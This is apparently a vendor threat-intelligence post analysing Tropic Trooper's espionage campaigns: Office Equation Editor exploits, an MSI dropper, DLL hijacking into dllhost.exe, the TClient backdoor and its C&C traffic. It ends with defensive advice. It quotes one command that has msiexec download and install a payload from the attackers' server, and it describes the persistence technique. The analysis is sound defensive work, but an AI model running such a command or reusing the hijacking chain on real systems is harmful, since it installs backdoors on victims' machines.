		<div>
			<p><a href="https://www.trendmicro.com/vinfo/us/security/news/cyber-attacks/operation-tropic-trooper-infiltrates-secret-keepers">Tropic Trooper</a> (also known as KeyBoy) levels its campaigns against Taiwanese, Philippine, and Hong Kong targets, focusing on their government, healthcare, transportation, and high-tech industries. Its operators are believed to be very organized and develop their own cyberespionage tools that they fine-tuned in their recent campaigns. Many of the tools they use now feature new behaviors, including a change in the way they maintain a foothold in the targeted network.<br />
</p>
<p><b><span class="body-subhead-title">Attack Chain</span></b></p>
<p style="text-align: center;"><a href="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2018/03/tropic-trooper-01.jpg"><img src="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2018/03/tropic-trooper-01.jpg"/></a>Figure 1. Attack chain of Tropic Trooper’s operations</p>
<p>Here’s a summary of the attack chain of Tropic Trooper’s recent campaigns:</p>
<ol>
<li>Execute a command through exploits for <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/cve-2017-11882-exploited-deliver-cracked-version-loki-infostealer/">CVE-2017-11882</a> or <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/januarys-patch-tuesday-fixes-56-security-issues-including-meltdown-spectre/">CVE-2018-0802</a>, security flaws in Microsoft Office’s Equation Editor (EQNEDT32.EXE).</li>
<li>Download an installer package (.msi) and install it on the system by executing the command: <i>/c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys])</i>.</li>
<li>This system configuration file (in.sys) will drop a backdoor installer (<i>UserInstall.exe</i>) then delete itself. The backdoor installer will drop a normal <i>sidebar.exe file</i> (a Windows Gadget tool, a feature already <a href="https://support.microsoft.com/en-ph/help/13787/gadgets-have-been-discontinued">discontinued</a> by Windows), a malicious loader (in <i>&quot;C:\ProgramData\Apple\Update\wab32res.dll</i>&quot;), and an encrypted configuration file. <i>UserInstall.exe</i> will abuse the <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa362813(v=vs.85).aspx">BITSadmin</a> command-line tool to create a job and launch <i>sidebar.exe</i>.</li>
<li>The malicious loader will use dynamic-link library (DLL) hijacking — injecting malicious code into a process of a file/application — on <i>sidebar.exe</i> and launch <i>dllhost.exe</i> (a normal file). The loader will then inject a DLL backdoor into <i>dllhost.exe</i>.</li>
</ol>
<p>We also observed malicious documents that don’t need to download anything from the internet as the backdoor’s dropper is already embedded in the document. This, however, doesn’t influence the overall result for the victim.</p>
<p>The backdoor will load the encrypted configuration file and decrypt it, then use Secure Sockets Layer (SSL) protocol to connect to command-and-control (C&amp;C) servers.</p>
<p>Tropic Trooper uses exploit-laden Microsoft Office documents to deliver malware to targets. These documents use job vacancies in organizations that may be deemed socio-politically sensitive to recipients. Below is a screenshot of the document used in their latest campaigns:</p>
<p style="text-align: center;"><a href="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2018/03/tropic-trooper-02.png"><img src="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2018/03/tropic-trooper-02.png"/></a>Figure 2. Malicious document used by Tropic Trooper</p>
<p><span class="body-subhead-title"><b>PDB Strings as Context Clues</b></span></p>
<p>The MSI file has two program database (PDB) strings inside: one belonging to the MSI file, and another for the backdoor installer (detected by Trend Micro as TROJ_TCDROP.ZTFB).</p>
<p style="text-align: center;"><a href="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2018/03/tropic-trooper-03.png"><img src="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2018/03/tropic-trooper-03.png"/></a>Figure 3. PDB strings inside the MSI file</p>
<p>The first PDB string has a certain <i>ss2/Projects/MsiWrapper</i> (Project MsiWrapper) in it, which we found to be an open-source application that converts executable setup programs to MSI files. The second PDB string contains Work, House, and TSSL: we can assume this tool belongs to Tropic Trooper’s TSSL project as <a href="https://www.pwc.co.uk/issues/cyber-security-data-privacy/research/the-keyboys-are-back-in-town.html">seen</a> by other researchers. Here it is a new one, as seen in their misspelling of “Horse” to “House” (other reports had the string typed correctly).</p>
<p>Another interesting PDB string we found is - <i>D:\Work\Project\VS\house\Apple\Apple_20180115\Release\InstallClient.pdb</i>. At installation, the MSI file drops three files and creates one hidden directory (UFile) into <i>C:\ProgramData\Apple\Update\</i>, likely as a ruse.</p>
<p>It would then use <i>sidebar.exe</i> to load the malicious <i>wab32res.dll</i> (TROJ_TCLT.ZDFB) through DLL hijacking. This is carried out to evade antivirus (AV) detection, because <i>wab32res.dll</i> is loaded by a benign file.</p>
<p style="text-align: center;"><a href="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2018/03/tropic-trooper-04.png"><img src="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2018/03/tropic-trooper-04.png"/></a>Figure 4. The installer drops three files into the Apple/Update directory</p>
<p style="text-align: center;"><a href="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2018/03/tropic-trooper-05.png"><img src="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2018/03/tropic-trooper-05.png"/></a>Figure 5. PDB strings inside the loader file</p>
<p>From the PDB string above, the attackers intended it to be a loader (hence the name <i>FakeRun</i>) and not the actual backdoor. FakeRun’s PDB string (<i>D:\Work\Project\VS\house\Apple\Apple_20180115\Release\FakeRun.pdb</i>) indicates the loader will execute <i>dllhost.exe</i> and inject one malicious DLL file, which is the backdoor, into this process. The backdoor, TClient (BKDR_TCLT.ZDFB), is so named from its own PDB string.</p>
<p style="text-align: center;"><a href="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2018/03/tropic-trooper-06.png"><img src="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2018/03/tropic-trooper-06.png"/></a>Figure 6. TClient is injected into dllhost.exe</p>
<p><b><span class="body-subhead-title">Malware Analysis </span></b></p>
<p><i>wab32res.dll</i> (FakeRun loader) loads TClient. Once the loader is executed, it will check the current process (<i>sidebar.exe</i>) whether to load it or not. Successfully checking the loader will execute the <i>dllhost.exe</i> process and create a hardcode mutex to avoid injecting it into the wrong <i>dllhost.exe</i>, as there can be multiple instances of it depending on the number of programs using the <a href="https://msdn.microsoft.com/en-us/library/ms524990(v=vs.90).aspx">Internet Information Services</a>.</p>
<p style="text-align: center;"><a href="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2018/03/tropic-trooper-07.png"><img src="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2018/03/tropic-trooper-07.png"/></a>Figure 7. The loader checking the sidebar process</p>
<p style="text-align: center;"><a href="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2018/03/tropic-trooper-08.png"><img src="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2018/03/tropic-trooper-08.png"/></a>Figure 8. The malicious loader injecting the backdoor into dllhost.exe</p>
<p style="text-align: center;"><a href="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2018/03/tropic-trooper-09.png"><img src="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2018/03/tropic-trooper-09.png"/></a>Figure 9. Comparison of TClient’s configuration format in 2016 (left, from other <a href="https://citizenlab.ca/2016/11/parliament-keyboy/">researchers</a>) and 2018 (right)</p>
<p>TClient will use SSL to connect to Tropic Trooper’s C&amp;C server. However, the C&amp;C server and some configuration values are not hardcoded in the backdoor. This allows Tropic Trooper’s operators to easily change/update the C&amp;C server and configure other values.</p>
<p>TClient is actually one of Tropic Trooper’s other backdoors. The backdoor noted by other security researchers was encoded with different algorithms and configured with different parameter names in 2016, for instance. TClient uses symmetric encryption to decrypt its configuration with one 16-byte key in 2018. The image and table below illustrate TClient’s encrypted configuration that we decrypted (via Python code):</p>
<p style="text-align: center;"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/03/tropic-trooper-10.png"><img src="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2018/03/tropic-trooper-10.jpg"/></a></p>
<p style="text-align: center;">Figure 10. Snapshot of code we used to decrypt TClient’s configuration</p>

<p>Reverse analysis of TClient allowed us to determine how to decrypt the C&amp;C information. TClient will use custom SSL libraries to connect the C&amp;C server. We also found another SSL certificate on this C&amp;C server. A closer look reveals that it was registered quite recently, and is set to expire after a year, suggesting Tropic Trooper’s use or abuse of components or services that elapse so they can leave as few traces as possible.</p>
<p style="text-align: center;"><a href="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2018/03/tropic-trooper-13.png"><img src="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2018/03/tropic-trooper-13.png"/></a>Figure 13. SSL certificate’s validity</p>
<p><b><span class="body-subhead-title">Following Tropic Trooper’s Trails</span></b><i><b><span class="body-subhead-title"></span></b></i></p>
<p>We further monitored their activities and found three additional and notable PDB strings in their malware:</p>
<ul>
<li><span class="rte-red-bullet">D:\Work\Project\VS\HSSL\HSSL_Unicode _2\Release\ServiceClient.pdb</span></li>
<li><span class="rte-red-bullet">D:\Work\VS\Horse\TSSL\TSSL_v3.0\TClient\Release\TClient.pdb</span></li>
<li><span class="rte-red-bullet">D:\Work\VS\Horse\TSSL\TSSL_v0.3.1_20170722\TClient\x64\Release\TClient.pdb</span></li>
</ul>
<p>These came from open-intelligence platforms and incident response cases. These strings shed further light on Tropic Trooper’s operations:</p>
<ul>
<li><span class="rte-red-bullet">They have another campaign/project named HSSL, which supports Unicode characters.</span></li>
<li><span class="rte-red-bullet">The TSSL project has a v3.0 version, indicating the operators can mix and match different versions of their malware, depending on their target.</span></li>
<li><span class="rte-red-bullet">The TSSL project has 64-bit version.</span></li>
</ul>
<p><b><span class="body-subhead-title">The Need for a Proactive Incident Response Strategy</span></b></p>
<p>Cyberespionage campaigns are persistent and, as shown by Tropic Trooper, always raring to exploit weaknesses in people and technology. For organizations, this highlights the significance of staying ahead of their attackers: detect, analyze, and respond. What techniques will they use? How can my organization’s attack surface be reduced? What did I do to respond to the threat — what worked, what didn’t, and what could be fine-tuned?</p>
<p>A <a href="http://blog.trendmicro.com/trendlabs-security-intelligence/four-steps-to-an-effective-targeted-attack-response/">proactive incident response strategy</a> provides threat intelligence — from the endpoint to the network — that can let IT/system administrators identify malicious activities that aren’t typically visible to traditional security solutions.</p>
<p>TClient, for instance, uses DLL hijacking and injection that may not be as noticeable to others. Its use of the SSL protocol also means it can blend with legitimate traffic. Analyzing their PDB strings can also provide a deeper insight into the campaign’s bigger picture. Ascertaining the tactics and techniques they use empower organizations in developing robust and actionable indicators of compromise (IoCs) that can act as benchmarks for response.</p>
<p>Here are some best practices that organizations can adopt:</p>
<ul>
<li><span class="rte-red-bullet">Keep the system, its applications, and the network updated. The vulnerabilities that Tropic Trooper’s campaigns have been patched last <a href="https://www.trendmicro.com/vinfo/us/threat-encyclopedia/vulnerability/7831/january-2018-microsoft-releases-56-security-patches">January</a>, for instance. Enforce a stronger <a href="https://www.trendmicro.com/vinfo/us/security/news/vulnerabilities-and-exploits/patching-problems-and-how-to-solve-them">patch management</a> policy, and consider virtual patching for legacy systems.</span></li>
<li><span class="rte-red-bullet">Enforce the principle of least privilege: Employ <a href="https://www.trendmicro.com/vinfo/us/security/news/cyber-attacks/protecting-data-through-network-segmentation">network segmentation</a> and <a href="https://www.trendmicro.com/vinfo/us/security/news/cyber-attacks/protecting-data-through-network-segmentation">data categorization</a> to deter lateral movement and mitigate further exposure. Application control and behavior monitoring block suspicious files and anomalous routines from being installed or executed in the system.</span></li>
<li><span class="rte-red-bullet">Disable or <a href="https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/best-practices-securing-sysadmin-tools">secure the use of system administration tools</a> such as <a href="https://www.trendmicro.com/vinfo/us/security/news/security-technology/security-101-the-rise-of-fileless-threats-that-abuse-powershell">PowerShell</a> and other <a href="https://www.trendmicro.com/vinfo/us/security/news/security-technology/2017-notably-abused-system-administration-tools-and-protocols">command-line tools</a> that may be abused.</span></li>
<li><span class="rte-red-bullet">Actively monitor your perimeter, from gateways and endpoints to networks and servers. Firewalls as well as <a href="/en_us/business/products/network/intrusion-prevention.html">intrusion detection and prevention systems</a> help thwart network-based attacks.</span></li>
<li><span class="rte-red-bullet">Nurture a culture of cybersecurity. Spear-phishing emails, for instance, rely on baiting targets with socially engineered documents. The technologies that help protect the organization are only as good as the people who use them.</span></li>
</ul>
<p> </p>
